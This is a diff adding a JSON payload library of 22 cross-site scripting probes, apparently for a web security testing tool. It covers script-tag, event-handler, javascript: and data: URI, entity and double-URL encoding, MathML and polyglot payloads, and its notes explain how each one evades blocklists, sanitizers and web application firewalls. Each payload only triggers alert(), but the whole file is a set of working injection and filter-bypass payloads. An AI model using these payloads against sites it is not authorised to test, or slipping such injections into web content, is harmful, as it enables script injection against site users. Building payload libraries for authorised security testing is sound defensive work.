@@ -1,0 +1,160 @@
+{
+  "id": "xss",
+  "label": "XSS",
+  "entries": [
+    {
+      "id": "script-alert",
+      "label": "Canonical script alert",
+      "payload": "<script>alert(1)</script>",
+      "notes": "Baseline reflected XSS probe — confirms unfiltered tag injection.",
+      "tags": ["reflected", "canonical"]
+    },
+    {
+      "id": "break-attribute-script",
+      "label": "Break out of attribute then inject script",
+      "payload": "\"><script>alert(1)</script>",
+      "notes": "Closes a quoted attribute and a tag before injecting; common against value=\"...\" sinks.",
+      "tags": ["reflected", "attribute-break"]
+    },
+    {
+      "id": "img-onerror",
+      "label": "img onerror",
+      "payload": "<img src=x onerror=alert(1)>",
+      "notes": "Fires on the broken-src error event; useful when <script> is filtered.",
+      "tags": ["event-handler", "img"]
+    },
+    {
+      "id": "svg-onload",
+      "label": "svg onload",
+      "payload": "<svg/onload=alert(1)>",
+      "notes": "Inline SVG fires onload immediately; passes some tag-name allowlists that miss <svg>.",
+      "tags": ["event-handler", "svg"]
+    },
+    {
+      "id": "svg-onload-backtick",
+      "label": "svg onload, no parens (backtick call)",
+      "payload": "<svg onload=alert`1`>",
+      "notes": "Tagged-template call avoids parentheses — defeats naive '(' blocklists.",
+      "tags": ["svg", "waf-bypass", "no-parens"]
+    },
+    {
+      "id": "iframe-srcdoc",
+      "label": "iframe srcdoc",
+      "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+      "notes": "Inline-document iframe; useful where srcdoc isn't sanitized as HTML.",
+      "tags": ["iframe", "stored"]
+    },
+    {
+      "id": "body-onload",
+      "label": "body onload",
+      "payload": "<body onload=alert(1)>",
+      "notes": "Fires on document load; occasionally accepted in stored sinks that strip <script>.",
+      "tags": ["stored", "event-handler"]
+    },
+    {
+      "id": "input-autofocus",
+      "label": "input autofocus + onfocus",
+      "payload": "<input autofocus onfocus=alert(1)>",
+      "notes": "Self-triggers without user interaction via autofocus + onfocus.",
+      "tags": ["event-handler", "self-trigger"]
+    },
+    {
+      "id": "details-ontoggle",
+      "label": "details ontoggle",
+      "payload": "<details open ontoggle=alert(1)>",
+      "notes": "Open <details> fires ontoggle on render; survives some HTML filters that miss the tag.",
+      "tags": ["event-handler", "html5"]
+    },
+    {
+      "id": "attribute-mouseover",
+      "label": "Attribute injection — onmouseover",
+      "payload": "\" onmouseover=alert(1) x=\"",
+      "notes": "Injects a new attribute inside an existing tag; needs the page to render the surrounding tag for the user to hover.",
+      "tags": ["attribute-injection", "event-handler"]
+    },
+    {
+      "id": "javascript-uri",
+      "label": "javascript: URI",
+      "payload": "javascript:alert(1)",
+      "notes": "Place into href/src sinks (a, iframe, form action). Modern browsers block top-frame js: navigation but in-page sinks still trigger.",
+      "tags": ["dom", "uri"]
+    },
+    {
+      "id": "data-uri-html",
+      "label": "data: URI HTML",
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "notes": "data: URI in iframe src; some sandboxes miss this when blocking javascript: only.",
+      "tags": ["dom", "uri", "iframe"]
+    },
+    {
+      "id": "case-mixed-script",
+      "label": "Case-mixed <ScRiPt>",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "notes": "Defeats case-sensitive 'script' blocklists; HTML parsing is case-insensitive.",
+      "tags": ["waf-bypass", "case"]
+    },
+    {
+      "id": "html-entity-script",
+      "label": "HTML-entity-encoded angle brackets",
+      "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+      "notes": "Sinks that decode entities before rendering will still execute; tests for double-decoding bugs.",
+      "tags": ["waf-bypass", "encoding"]
+    },
+    {
+      "id": "anchor-js-colon-entity",
+      "label": "Anchor with javascript&colon; entity",
+      "payload": "<a href=\"javascript&colon;alert(1)\">click</a>",
+      "notes": "Named entity for ':' bypasses filters that match the literal 'javascript:' prefix.",
+      "tags": ["waf-bypass", "encoding", "uri"]
+    },
+    {
+      "id": "double-url-encode",
+      "label": "Double-URL-encoded payload",
+      "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "notes": "Server decodes once (yielding %3C...) and downstream sink decodes again — classic double-decode bug.",
+      "tags": ["waf-bypass", "encoding"]
+    },
+    {
+      "id": "math-mtext",
+      "label": "MathML mtext + script",
+      "payload": "<math><mtext><script>alert(1)</script></mtext></math>",
+      "notes": "MathML / SVG foreign-content parser quirks let <script> through some sanitizers.",
+      "tags": ["waf-bypass", "mathml", "stored"]
+    },
+    {
+      "id": "iframe-srcdoc-entity",
+      "label": "iframe srcdoc with entities",
+      "payload": "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
+      "notes": "Entities inside srcdoc are decoded by the inner parser — useful when '<' is filtered in the outer context.",
+      "tags": ["iframe", "encoding", "waf-bypass"]
+    },
+    {
+      "id": "marquee-onstart",
+      "label": "marquee onstart",
+      "payload": "<marquee onstart=alert(1)>",
+      "notes": "Legacy tag still parsed by browsers; onstart fires immediately. Useful where common tags are blocked.",
+      "tags": ["event-handler", "legacy"]
+    },
+    {
+      "id": "form-action-js",
+      "label": "Form action javascript:",
+      "payload": "<form action=javascript:alert(1)><input type=submit></form>",
+      "notes": "Submit-button click triggers; tests action-attribute sanitization on form elements.",
+      "tags": ["dom", "form", "uri"]
+    },
+    {
+      "id": "polyglot-classic",
+      "label": "OWASP polyglot",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "notes": "Single string that fires across many contexts (attribute, JS string, comment, tag). Useful for one-shot mass testing.",
+      "tags": ["polyglot", "multi-context"]
+    },
+    {
+      "id": "object-data",
+      "label": "object data:",
+      "payload": "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
+      "notes": "Embeds an HTML document; passes some filters that block <iframe> by name.",
+      "tags": ["object", "uri", "stored"]
+    }
+  ]
+}
